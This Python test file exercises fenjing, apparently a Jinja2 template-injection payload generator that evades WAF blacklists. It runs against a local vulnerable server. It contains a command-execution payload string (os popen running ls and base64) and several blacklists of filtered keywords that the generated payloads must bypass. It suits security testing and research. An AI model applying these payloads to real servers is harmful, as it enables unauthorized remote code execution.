import sys


sys.path.append("..")  # noqa

from fenjing.form import get_form
from fenjing.requester import Requester

from fenjing.submitter import FormSubmitter  # noqa

import fenjing
import logging
import os

from fenjing import FullPayloadGen, const
import unittest
import random

fenjing.full_payload_gen.logger.setLevel(logging.ERROR)
fenjing.payload_gen.logger.setLevel(logging.ERROR)


def get_full_payload_gen(blacklist, detect_mode=fenjing.const.DETECT_MODE_ACCURATE):
    return FullPayloadGen(
        lambda x: all(word not in x for word in blacklist),
        detect_mode=detect_mode,
    )


VULUNSERVER_ADDR = os.environ["VULUNSERVER_ADDR"]


class FullPayloadGenTestCaseSimple(unittest.TestCase):
    def setUp(self) -> None:
        super().setUp()
        self.blacklist = [
            "[",
            "]",
        ]
        self.full_payload_gen = get_full_payload_gen(self.blacklist)
        self.subm = FormSubmitter(
            url=VULUNSERVER_ADDR,
            form=get_form(action="/", inputs=["name"], method="GET"),
            target_field="name",
            requester=Requester(interval=0.01),
        )

    def test_string(self):
        strings = [
            "123",
            "asdf",
            "__dunder__",
            "__import__('os').popen('echo test_command/$(ls / | base64 -w)').read()",
        ]
        for string in strings:
            payload, _ = self.full_payload_gen.generate(const.STRING, string)
            # self.assertIsNotNone(payload)
            assert payload is not None
            # why?
            # cause the stupid type checker thinks the 'payload' below would still be None
            resp = self.subm.submit(payload)
            assert resp is not None
            self.assertIn(string, resp.text)
            for word in self.blacklist:
                self.assertNotIn(word, payload)

    def test_os_popen_read(self):
        payload, _ = self.full_payload_gen.generate(
            const.OS_POPEN_READ, "echo fen  jing;"
        )
        # self.assertIsNotNone(payload)
        assert payload is not None
        # why?
        # cause the stupid type checker thinks the 'payload' below would still be None
        resp = self.subm.submit(payload)
        assert resp is not None
        self.assertIn("fen jing", resp.text)
        for word in self.blacklist:
            self.assertNotIn(word, payload)


class FullPayloadGenTestCaseHard(FullPayloadGenTestCaseSimple):
    def setUp(self) -> None:
        super().setUp()
        self.blacklist = [
            "config",
            "self",
            "g",
            "os",
            "class",
            "length",
            "mro",
            "base",
            "lipsum",
            "[",
            '"',
            "'",
            "_",
            ".",
            "+",
            "~",
            "{{",
            "0",
            "1",
            "2",
            "3",
            "4",
            "5",
            "6",
            "7",
            "8",
            "9",
            "０",
            "１",
            "２",
            "３",
            "４",
            "５",
            "６",
            "７",
            "８",
            "９",
        ]
        self.full_payload_gen = get_full_payload_gen(self.blacklist)


class FullPayloadGenTestCaseHard2(FullPayloadGenTestCaseSimple):
    def setUp(self) -> None:
        super().setUp()
        self.blacklist = [
            "_",
            "'",
            '"',
            ".",
            "system",
            "os",
            "eval",
            "exec",
            "popen",
            "subprocess",
            "posix",
            "builtins",
            "namespace",
            "open",
            "read",
            "\\",
            "self",
            "mro",
            "base",
            "global",
            "init",
            "/",
            "00",
            "chr",
            "value",
            "get",
            "url",
            "pop",
            "import",
            "include",
            "request",
            "{{",
            "}}",
            '"',
            "config",
            "=",
        ]
        self.full_payload_gen = get_full_payload_gen(self.blacklist)


class FullPayloadGenTestCaseStringFormat1(FullPayloadGenTestCaseSimple):
    def setUp(self) -> None:
        super().setUp()
        self.blacklist = [
            "_",
            "'",
            '"',
            ".",
            "system",
            "os",
            "eval",
            "exec",
            "popen",
            "subprocess",
            "posix",
            "builtins",
            "namespace",
            "open",
            "read",
            "\\",
            "=",
            "%"
        ]
        self.full_payload_gen = get_full_payload_gen(self.blacklist)

class FullPayloadGenTestCaseStringFormat2(FullPayloadGenTestCaseSimple):
    def setUp(self) -> None:
        super().setUp()
        self.blacklist = [
            "_",
            "'",
            '"',
            ".",
            "system",
            "os",
            "eval",
            "exec",
            "popen",
            "subprocess",
            "posix",
            "builtins",
            "namespace",
            "open",
            "read",
            "\\",
            "=",
            "%",
            "|format"
        ]
        self.full_payload_gen = get_full_payload_gen(self.blacklist)

class FullPayloadGenTestCaseSubs(FullPayloadGenTestCaseSimple):
    def setUp(self) -> None:
        super().setUp()
        self.blacklist = [
            "+",
            "~",
            "_",
            '"',
            "'",
            "sum",
            "dict",
            "length",
            "1",
            "2",
            "3",
            "4",
            "5",
        ]
        self.full_payload_gen = get_full_payload_gen(self.blacklist)


class FullPayloadGenTestCaseMul(FullPayloadGenTestCaseSimple):
    def setUp(self) -> None:
        super().setUp()
        self.blacklist = ["-", "~", "__", '"', "'", "sum", "dict", "length", "0", "1", "2", "3", "4"]
        self.full_payload_gen = get_full_payload_gen(self.blacklist)

class FullPayloadGenTestCaseRandom(FullPayloadGenTestCaseSimple):
    def setUp(self) -> None:
        super().setUp()
        self.blacklists = [
            random.sample(
                [
                    "config",
                    "self",
                    "g",
                    "os",
                    "class",
                    "length",
                    "mro",
                    "base",
                    "lipsum",
                    "[",
                    '"',
                    "'",
                    "_",
                    ".",
                    "+",
                    "~",
                    "{{",
                    "0",
                    "1",
                    "2",
                    "3",
                    "4",
                    "5",
                    "6",
                    "7",
                    "8",
                    "9",
                    "０",
                    "１",
                    "２",
                    "３",
                    "４",
                    "５",
                    "６",
                    "７",
                    "８",
                    "９",
                ],
                k=25,
            )
            for _ in range(50)
        ]
        self.full_payload_gens = [
            get_full_payload_gen(
                blacklist,
                detect_mode=random.choice(
                    [
                        fenjing.const.DETECT_MODE_ACCURATE,
                        fenjing.const.DETECT_MODE_FAST,
                    ]
                ),
            )
            for blacklist in self.blacklists
        ]
